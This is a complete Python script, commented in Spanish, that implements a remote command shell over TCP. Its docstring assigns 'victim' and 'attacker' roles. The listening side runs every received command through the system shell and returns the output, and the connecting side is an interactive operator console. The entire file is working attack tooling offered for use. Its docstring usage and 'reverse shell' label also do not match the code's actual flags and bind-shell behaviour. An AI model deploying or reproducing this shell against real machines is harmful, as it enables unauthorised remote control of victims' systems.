#!/usr/bin/env python3
"""
telefono.py — shell inversa TCP con interfaz interactiva
Uso:
  Receptor (víctima): python3 telefono.py --listen  --port 4444
  Atacante:           python3 telefono.py --connect --host 192.168.1.10 --port 4444
"""

import socket
import threading
import sys
import argparse
import subprocess
import os

BUFFER = 4096
ENCODING = "utf-8"

# ── MODO LISTEN: ejecuta comandos del sistema ─────────────────────────────────

def modo_escucha(port: int):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", port))
    srv.listen(1)
    print(f"[*] Escuchando en 0.0.0.0:{port} ...")
    conn, addr = srv.accept()
    print(f"[+] Conexión desde {addr[0]}:{addr[1]}")

    try:
        while True:
            data = conn.recv(BUFFER)
            if not data:
                break

            cmd = data.decode(ENCODING).strip()
            if not cmd:
                continue

            # Comando especial: cambiar directorio
            if cmd.startswith("cd "):
                try:
                    os.chdir(cmd[3:].strip())
                    output = ""
                except Exception as e:
                    output = str(e)
            else:
                try:
                    result = subprocess.run(
                        cmd, shell=True, capture_output=True,
                        timeout=30, cwd=os.getcwd()
                    )
                    output = result.stdout.decode(ENCODING, errors="replace")
                    output += result.stderr.decode(ENCODING, errors="replace")
                except subprocess.TimeoutExpired:
                    output = "[!] Timeout\n"
                except Exception as e:
                    output = f"[!] Error: {e}\n"

            # Enviar output + prompt actual
            prompt = f"\n[{os.getcwd()}]$ "
            conn.sendall((output + prompt).encode(ENCODING))

    except Exception:
        pass
    finally:
        conn.close()
        print("\n[*] Conexión cerrada.")

# ── MODO CONNECT: interfaz interactiva con readline ───────────────────────────

def modo_conectar(host: str, port: int):
    try:
        import readline
        import rlcompleter
    except ImportError:
        readline = None

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print(f"[*] Conectando a {host}:{port} ...")
    sock.connect((host, port))

    # ── Historial ──────────────────────────────────────────────────────────────
    history_file = os.path.expanduser("~/.telefono_history")
    if readline:
        try:
            readline.read_history_file(history_file)
        except FileNotFoundError:
            pass
        readline.set_history_length(500)

    # ── Autocompletar con comandos del sistema ─────────────────────────────────
    comandos_sistema = []
    for d in os.environ.get("PATH", "").split(os.pathsep):
        try:
            comandos_sistema += os.listdir(d)
        except Exception:
            pass

    class ShellCompleter:
        def __init__(self, opciones):
            self.opciones = sorted(set(opciones))
            self.matches  = []

        def complete(self, text, state):
            if state == 0:
                self.matches = [c for c in self.opciones if c.startswith(text)]
                # Autocompletar paths de archivo
                if text.startswith(("./", "/", "~")):
                    expanded = os.path.expanduser(text)
                    self.matches = [
                        f for f in _expand_path(expanded)
                    ]
            try:
                return self.matches[state]
            except IndexError:
                return None

    def _expand_path(prefix):
        dirname  = os.path.dirname(prefix)  or "."
        basename = os.path.basename(prefix) or ""
        try:
            return [
                os.path.join(dirname, f) if dirname != "." else f
                for f in os.listdir(dirname)
                if f.startswith(basename)
            ]
        except Exception:
            return []

    if readline:
        completer = ShellCompleter(comandos_sistema)
        readline.set_completer(completer.complete)
        readline.parse_and_bind("tab: complete")

    # ── Banner ─────────────────────────────────────────────────────────────────
    _banner(host, port)

    # Hilo receptor: imprime output del servidor
    salida = {"activo": True}

    def recibir():
        try:
            while salida["activo"]:
                data = sock.recv(BUFFER)
                if not data:
                    break
                sys.stdout.write("\r" + data.decode(ENCODING, errors="replace"))
                sys.stdout.flush()
        except Exception:
            pass

    t = threading.Thread(target=recibir, daemon=True)
    t.start()

    # ── Loop principal ─────────────────────────────────────────────────────────
    try:
        while True:
            try:
                cmd = input()
            except EOFError:
                break

            if not cmd.strip():
                continue

            if cmd.strip().lower() in ("exit", "quit", "q"):
                break

            if readline:
                readline.write_history_file(history_file)

            sock.sendall((cmd + "\n").encode(ENCODING))

    except KeyboardInterrupt:
        print("\n[*] Saliendo...")
    finally:
        salida["activo"] = False
        sock.close()
        print("[*] Conexión cerrada.")

# ── Banner ─────────────────────────────────────────────────────────────────────

def _banner(host, port):
    print(f"""
\033[1;32m
  ████████╗███████╗██╗     ███████╗███████╗ ██████╗ ███╗   ██╗ ██████╗ 
     ██╔══╝██╔════╝██║     ██╔════╝██╔════╝██╔═══██╗████╗  ██║██╔═══██╗
     ██║   █████╗  ██║     █████╗  █████╗  ██║   ██║██╔██╗ ██║██║   ██║
     ██║   ██╔══╝  ██║     ██╔══╝  ██╔══╝  ██║   ██║██║╚██╗██║██║   ██║
     ██║   ███████╗███████╗███████╗██║     ╚██████╔╝██║ ╚████║╚██████╔╝
     ╚═╝   ╚══════╝╚══════╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ 
\033[0m
\033[1;34m  [ Shell Remota Interactiva ]\033[0m
  Host   : \033[1;33m{host}:{port}\033[0m
  Tab    : autocompletar comandos y rutas
  ↑ / ↓  : historial de comandos
  exit   : cerrar conexión
\033[1;32m{'─'*65}\033[0m
""")

# ── Entry point ────────────────────────────────────────────────────────────────

def main():
    p = argparse.ArgumentParser(
        description="Teléfono TCP — shell remota",
        usage="\n  %(prog)s -l <puerto>\n  %(prog)s -c <host> <puerto>"
    )

    g = p.add_mutually_exclusive_group(required=True)
    g.add_argument("-l", metavar="PORT",  type=int,
                   help="Modo escucha  →  telefono.py -l 4444")
    g.add_argument("-c", metavar=("HOST", "PORT"), type=str, nargs=2,
                   help="Modo connect  →  telefono.py -c 192.168.1.2 4444")

    args = p.parse_args()

    if args.l:
        modo_escucha(args.l)
    else:
        host, port = args.c
        modo_conectar(host, int(port))

if __name__ == "__main__":
    main()